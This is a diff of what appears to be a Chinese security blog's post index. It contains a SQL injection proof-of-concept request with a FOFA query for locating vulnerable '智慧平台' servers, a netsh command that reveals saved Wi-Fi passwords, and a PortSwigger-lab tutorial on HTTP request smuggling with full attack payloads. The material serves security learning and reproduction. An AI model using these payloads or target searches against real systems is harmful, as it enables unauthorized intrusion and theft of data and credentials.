+    <content><![CDATA[<h1 id="智慧平台sexcelexperrashx存在sql注入漏洞"><a class="markdownIt-Anchor" href="#智慧平台sexcelexperrashx存在sql注入漏洞">#</a> 智慧平台 SExcelExpErr.ashx 存在 SQL 注入漏洞</h1>
+<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h2>
+<p>智慧平台 SExcelExpErr 存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据敏感信息。</p>
+<h2 id="fofa语句"><a class="markdownIt-Anchor" href="#fofa语句">#</a> fofa 语句</h2>
+<pre><code>body=&quot;custom/blue/uimaker/easyui.css&quot;
+</code></pre>
+<h2 id="poc"><a class="markdownIt-Anchor" href="#poc">#</a> POC</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ashx/KQ/SExcelExpErr.ashx?action=list&amp;importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+<h2 id="验证"><a class="markdownIt-Anchor" href="#验证">#</a> 验证</h2>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105160450.png" alt="20241105160450"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>日常小工具集合</title>
+    <url>/2024/11/11/%E6%97%A5%E5%B8%B8%E5%B0%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/</url>
+    <content><![CDATA[<h1 id="日常小工具集合"><a class="markdownIt-Anchor" href="#日常小工具集合">#</a> 日常小工具集合</h1>
+<h2 id="查询真实ip"><a class="markdownIt-Anchor" href="#查询真实ip">#</a> 查询真实 ip：</h2>
+<ul>
+<li><a href="https://search.censys.io/search?resource=hosts">https://search.censys.io/search?resource=hosts</a><br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111091858.png" alt="20241111091858"></li>
+</ul>
+<h2 id="ip提取"><a class="markdownIt-Anchor" href="#ip提取">#</a> IP 提取：</h2>
+<ul>
+<li><a href="https://potato.gold/navbar/tool/">https://potato.gold/navbar/tool/</a><br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111092147.png" alt="20241111092147"></li>
+</ul>
+<h2 id="查看wifi密码"><a class="markdownIt-Anchor" href="#查看wifi密码">#</a> 查看 wifi 密码</h2>
+<pre><code>netsh wlan show profiles
+</code></pre>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241205152751.png" alt="20241205152751"><br>
+name = 输入 wifi 名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles name=FL-5G-1393 key=clear</span><br></pre></td></tr></table></figure>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241205152913.png" alt="20241205152913"></p>
+]]></content>
+      <tags>
+        <tag>日常小工具</tag>
       </tags>
   </entry>
   <entry>
@@ -596,77 +596,6 @@ SHA256：ef18c975d970f42e959560ff9718d258316bce8e5295034f987cc40eddf95432</li>
 <h2 id="验证-4"><a class="markdownIt-Anchor" href="#验证-4">#</a> 验证</h2>
 <p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105154622.png" alt="20241105154622"></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>HTTP请求走私漏洞</title>
-    <url>/2024/12/26/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
-    <content><![CDATA[<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/056b.jpg" alt="device"></p>
-<h1 id="http请求走私漏洞"><a class="markdownIt-Anchor" href="#http请求走私漏洞">#</a> HTTP 请求走私漏洞</h1>
-<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2>
-<p>当前端服务器将 HTTP 请求转发到后端服务器时，通常会通过同一个后端网络连接发送多个请求，因为这样效率更高且性能更高。协议非常简单：一个接一个地发送 HTTP 请求，接收服务器解析 HTTP 请求头来确定一个请求从哪里结束，下一个请求从哪里开始：<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/f85b468533facbd42c300ff4dfdcf5b6.png" alt="f85b468533facbd42c300ff4dfdcf5b6"><br>
- 在这种情况下，前端和后端系统就请求之间的边界达成一致至关重要。否则，攻击者可能会发送一个模棱两可的请求，该请求会被前端和后端系统以不同的方式解释：<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/478cf3158fe654b300fc20198bf04981.png" alt="478cf3158fe654b300fc20198bf04981"><br>
- 在这里，攻击者导致他们的部分前端请求被后端服务器解释为下一个请求的开始。它有效地放在下一个请求之前，因此会干扰应用程序处理该请求的方式。这种请求走私攻击，可能会造成毁灭性的后果。</p>
-<h3 id="请求走私漏洞产生原因"><a class="markdownIt-Anchor" href="#请求走私漏洞产生原因">#</a> 请求走私漏洞产生原因</h3>
-<p>大多数 HTTP 请求走私漏洞的出现是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置：Content-Length 标头和 Transfer-Encoding 标头。<br>
-Content-Length 标头：它指定消息体的以字节为单位的长度。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure>
-<p>Transfer-Encoding 标头可用于指定消息正文使用分块编码。这意味着消息正文包含一个或多个数据块。每个块由以字节为单位的块大小（以十六进制表示）、后跟换行符和块内容组成。消息以大小为零的块终止。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<p>由于 HTTP 规范提供了两种不同的方法来指定 HTTP 消息的长度，因此一条消息可能会同时使用这两种方法，从而导致它们相互冲突。HTTP 规范试图通过声明如果 Content-Length 和 Transfer-Encoding 标头都存在，则应忽略 Content-Length 标头来防止出现此问题。当只有一个服务器在运行时，这可能足以避免歧义，但当两个或多个服务器链接在一起时就不行了。在这种情况下，出现问题的原因有两个：</p>
-<p>某些服务器不支持 Transfer-Encoding 请求中的标头。</p>
-<p>Transfer-Encoding 如果以某种方式混淆了标头，则可以诱导 某些支持标头的服务器不处理它。</p>
-<p>如果前端和后端服务器对（可能混淆的）Transfer-Encoding 标头的行为不同，那么它们可能不同意连续请求之间的边界，从而导致请求走私漏洞。</p>
-<h3 id="请求走私漏洞类型介绍以及利用"><a class="markdownIt-Anchor" href="#请求走私漏洞类型介绍以及利用">#</a> 请求走私漏洞类型介绍以及利用</h3>
-<p>接下来会通过 portswigger 中的请求走私漏洞靶场对请求走私漏洞进行更详细的介绍和利用。以下为 Content-Length 简称为 CL，Transfer-Encoding 简称为 TE。</p>
-<h4 id="cl不为0的get请求"><a class="markdownIt-Anchor" href="#cl不为0的get请求">#</a> CL 不为 0 的 GET 请求</h4>
-<p>（1）前端代理服务器允许 GET 请求携带请求体，但后端服务器不允许 GET 请求携带请求体，则后端服务器会忽略掉 GET 请求中的 Content-Length，不进行处理，从而导致请求走私，代码演示如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<p>（2）前端服务器收到该请求，通过读取 Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对 Content-Length 进行处理，由于 Pipeline 的存在，它就认为这是收到了两个请求。</p>
-<h4 id="cl-cl"><a class="markdownIt-Anchor" href="#cl-cl">#</a> CL-CL</h4>
-<p>（1）假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回 400 错误，但是中间代理服务器按照第一个 Content-Length 的值对请求进行处理，而后端服务器按照第二个 Content-Length 的值进行处理。这样有可能引发请求走私。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
-<p>（2）前端代理服务器获取的数据包长度为 8，将以上数据包完整转发至后端服务器，但后端服务器仅接收长度为 7 的数据包。因此读取前 7 个字符后，后端服务器认为本次请求已经读取完毕，然后返回响应。</p>
-<p>（3）但此时缓冲区仍留下一个 a，对于后端服务器来讲，这个 a 是下一个请求的一部分，但没传输完毕。如果此时传来一个请求:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>
-<p>（4）那么前端服务器和后端服务器将重用 TCP 连接，使后端实际接收的请求为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aGET / HTTP/1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>
-<h4 id="cl-te"><a class="markdownIt-Anchor" href="#cl-te">#</a> CL-TE</h4>
-<p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理 Content-Length 这一请求头，而后端服务器会遵守 RFC2616 的规定，忽略掉 Content-Length，处理 Transfer-Encoding 这一请求头。</p>
-<p>chunk 传输数据格式如下，其中 size 的值由 16 进制表示:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
-<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a><br>
-（1）构造数据包：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
-<p>（2）连续发送几次请求可以获得响应：<br>
-<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226142332.png" alt="20241226142332"><br>
-（3）由于前端服务器处理 Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为 6，也就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
-<p>（4）当请求包经过代理服务器转发给后端服务器时，后端服务器处理 Transfer-Encoding，当它读取到 0\r\n\r\n 时，认为已经读取到结尾了，但是剩下的字母 G 就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-<h4 id="te-cl"><a class="markdownIt-Anchor" href="#te-cl">#</a> TE-CL</h4>
-<p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理 Transfer-Encoding 这一请求头，而后端服务器处理 Content-Length 请求头。</p>
-<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
-<p>（1）构造数据包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226142827.png" alt="20241226142827"><br>
-（2）由于前端服务器处理 Transfer-Encoding，当其读取到 0\r\n\r\n 时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 Content-Length 请求头，当它读取完 12\r\n 之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<h4 id="te-te"><a class="markdownIt-Anchor" href="#te-te">#</a> TE-TE</h4>
-<p>TE-TE，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理 Transfer-Encoding 请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的 Transfer-Encoding 进行某种混淆操作，从而使其中一个服务器不处理 Transfer-Encoding 请求头。从某种意义上还是 CL-TE 或者 TE-CL。</p>
-<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
-<p>（1）构造数据包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226142929.png" alt="20241226142929"><br>
- 需要 \r\n\r\n 在后面加上尾随序列 0。</p>
-<h3 id="请求走私工具"><a class="markdownIt-Anchor" href="#请求走私工具">#</a> 请求走私工具</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求走私工具：https://github.com/anshumanpattnaik/http-request-smuggling</span><br></pre></td></tr></table></figure>
-<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226143049.png" alt="20241226143049"></p>
-]]></content>
-      <tags>
-        <tag>神兵利器</tag>
-      </tags>
   </entry>
   <entry>
     <title>未授权访问漏洞合集</title>
@@ -746,6 +675,77 @@ docker-compose up -d<br>
 ]]></content>
       <tags>
         <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP请求走私漏洞</title>
+    <url>/2024/12/26/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
+    <content><![CDATA[<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/056b.jpg" alt="device"></p>
+<h1 id="http请求走私漏洞"><a class="markdownIt-Anchor" href="#http请求走私漏洞">#</a> HTTP 请求走私漏洞</h1>
+<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2>
+<p>当前端服务器将 HTTP 请求转发到后端服务器时，通常会通过同一个后端网络连接发送多个请求，因为这样效率更高且性能更高。协议非常简单：一个接一个地发送 HTTP 请求，接收服务器解析 HTTP 请求头来确定一个请求从哪里结束，下一个请求从哪里开始：<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/f85b468533facbd42c300ff4dfdcf5b6.png" alt="f85b468533facbd42c300ff4dfdcf5b6"><br>
+ 在这种情况下，前端和后端系统就请求之间的边界达成一致至关重要。否则，攻击者可能会发送一个模棱两可的请求，该请求会被前端和后端系统以不同的方式解释：<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/478cf3158fe654b300fc20198bf04981.png" alt="478cf3158fe654b300fc20198bf04981"><br>
+ 在这里，攻击者导致他们的部分前端请求被后端服务器解释为下一个请求的开始。它有效地放在下一个请求之前，因此会干扰应用程序处理该请求的方式。这种请求走私攻击，可能会造成毁灭性的后果。</p>
+<h3 id="请求走私漏洞产生原因"><a class="markdownIt-Anchor" href="#请求走私漏洞产生原因">#</a> 请求走私漏洞产生原因</h3>
+<p>大多数 HTTP 请求走私漏洞的出现是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置：Content-Length 标头和 Transfer-Encoding 标头。<br>
+Content-Length 标头：它指定消息体的以字节为单位的长度。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure>
+<p>Transfer-Encoding 标头可用于指定消息正文使用分块编码。这意味着消息正文包含一个或多个数据块。每个块由以字节为单位的块大小（以十六进制表示）、后跟换行符和块内容组成。消息以大小为零的块终止。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p>由于 HTTP 规范提供了两种不同的方法来指定 HTTP 消息的长度，因此一条消息可能会同时使用这两种方法，从而导致它们相互冲突。HTTP 规范试图通过声明如果 Content-Length 和 Transfer-Encoding 标头都存在，则应忽略 Content-Length 标头来防止出现此问题。当只有一个服务器在运行时，这可能足以避免歧义，但当两个或多个服务器链接在一起时就不行了。在这种情况下，出现问题的原因有两个：</p>
+<p>某些服务器不支持 Transfer-Encoding 请求中的标头。</p>
+<p>Transfer-Encoding 如果以某种方式混淆了标头，则可以诱导 某些支持标头的服务器不处理它。</p>
+<p>如果前端和后端服务器对（可能混淆的）Transfer-Encoding 标头的行为不同，那么它们可能不同意连续请求之间的边界，从而导致请求走私漏洞。</p>
+<h3 id="请求走私漏洞类型介绍以及利用"><a class="markdownIt-Anchor" href="#请求走私漏洞类型介绍以及利用">#</a> 请求走私漏洞类型介绍以及利用</h3>
+<p>接下来会通过 portswigger 中的请求走私漏洞靶场对请求走私漏洞进行更详细的介绍和利用。以下为 Content-Length 简称为 CL，Transfer-Encoding 简称为 TE。</p>
+<h4 id="cl不为0的get请求"><a class="markdownIt-Anchor" href="#cl不为0的get请求">#</a> CL 不为 0 的 GET 请求</h4>
+<p>（1）前端代理服务器允许 GET 请求携带请求体，但后端服务器不允许 GET 请求携带请求体，则后端服务器会忽略掉 GET 请求中的 Content-Length，不进行处理，从而导致请求走私，代码演示如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<p>（2）前端服务器收到该请求，通过读取 Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对 Content-Length 进行处理，由于 Pipeline 的存在，它就认为这是收到了两个请求。</p>
+<h4 id="cl-cl"><a class="markdownIt-Anchor" href="#cl-cl">#</a> CL-CL</h4>
+<p>（1）假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回 400 错误，但是中间代理服务器按照第一个 Content-Length 的值对请求进行处理，而后端服务器按照第二个 Content-Length 的值进行处理。这样有可能引发请求走私。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+<p>（2）前端代理服务器获取的数据包长度为 8，将以上数据包完整转发至后端服务器，但后端服务器仅接收长度为 7 的数据包。因此读取前 7 个字符后，后端服务器认为本次请求已经读取完毕，然后返回响应。</p>
+<p>（3）但此时缓冲区仍留下一个 a，对于后端服务器来讲，这个 a 是下一个请求的一部分，但没传输完毕。如果此时传来一个请求:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>
+<p>（4）那么前端服务器和后端服务器将重用 TCP 连接，使后端实际接收的请求为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aGET / HTTP/1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>
+<h4 id="cl-te"><a class="markdownIt-Anchor" href="#cl-te">#</a> CL-TE</h4>
+<p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理 Content-Length 这一请求头，而后端服务器会遵守 RFC2616 的规定，忽略掉 Content-Length，处理 Transfer-Encoding 这一请求头。</p>
+<p>chunk 传输数据格式如下，其中 size 的值由 16 进制表示:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
+<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a><br>
+（1）构造数据包：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>（2）连续发送几次请求可以获得响应：<br>
+<img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226142332.png" alt="20241226142332"><br>
+（3）由于前端服务器处理 Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为 6，也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>（4）当请求包经过代理服务器转发给后端服务器时，后端服务器处理 Transfer-Encoding，当它读取到 0\r\n\r\n 时，认为已经读取到结尾了，但是剩下的字母 G 就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<h4 id="te-cl"><a class="markdownIt-Anchor" href="#te-cl">#</a> TE-CL</h4>
+<p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理 Transfer-Encoding 这一请求头，而后端服务器处理 Content-Length 请求头。</p>
+<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
+<p>（1）构造数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226142827.png" alt="20241226142827"><br>
+（2）由于前端服务器处理 Transfer-Encoding，当其读取到 0\r\n\r\n 时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 Content-Length 请求头，当它读取完 12\r\n 之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+<h4 id="te-te"><a class="markdownIt-Anchor" href="#te-te">#</a> TE-TE</h4>
+<p>TE-TE，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理 Transfer-Encoding 请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的 Transfer-Encoding 进行某种混淆操作，从而使其中一个服务器不处理 Transfer-Encoding 请求头。从某种意义上还是 CL-TE 或者 TE-CL。</p>
+<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
+<p>（1）构造数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
